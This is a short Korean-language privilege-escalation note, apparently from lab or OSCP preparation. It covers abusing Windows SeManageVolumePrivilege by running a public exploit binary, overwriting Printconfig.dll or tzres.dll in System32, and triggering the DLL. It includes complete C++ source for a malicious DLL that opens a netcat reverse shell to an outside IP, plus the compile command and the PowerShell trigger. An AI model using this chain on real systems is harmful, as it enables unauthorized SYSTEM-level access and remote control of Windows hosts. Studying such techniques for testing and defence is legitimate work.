
SeManageVolumePrivilege권한을 사용하면 드라이브 포맷, 새 파티션 생성, 드라이브 문자 할당 등의 작업을 포함하여 디스크 볼륨을 관리할 수 있다. 이 권한만으로는 완전한 Admin 권한을 부여하지는 않지만, 특정 도구나 기법을 활용한다면 권한을 상승시킬 수 있다.


### SeManageVolumeExploit
**SeManageVolumeExploit** 바이너리를 악용하면 **C:\Windows\System32** 의 쓰기 권한을 수정하여 쓰기 가능하게 만들어 **DLL Hijacking**을 통한 시스템 권한 탈취가 가능하다.

https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public?source=post_page-----12ad7f6bad6f---------------------------------------
여기서 SeManageVolumeExploit.exe 다운해서, 실행한다.


### Printconfig.dll Exploit

`C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll` 파일을 Overwrite 한 뒤, powershell 에서 아래 명령어를 실행하면, dll 이 실행된다.

```powershell
$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")  
$object = [Activator]::CreateInstance($type)
```

dll 파일 작성 예시는 아래와 같다.

**abuse.cpp**
```cpp
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
            i = system ("C:\\temp\\nc.exe -e cmd.exe 192.168.45.218 443");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}

```

컴파일은 아래 커맨드로 수행한다.
```bash
x86_64-w64-mingw32-gcc abuse.cpp --shared -o Printconfig.dll
```

출처: https://banua.medium.com/proving-grounds-access-oscp-prep-2025-practice-7-557f902bf1a9


### tzres.dll
`C:\Windows\System32\wbem\tzres.dll (systeminfo, NetworkService)` 를 악용하는 방법도 있다.

위와 같이 `C:\Windows\System32\wbem\tzres.dll`를 Overwrite 이후 systeminfo 를 입력하면 dll 코드가 실행된다.
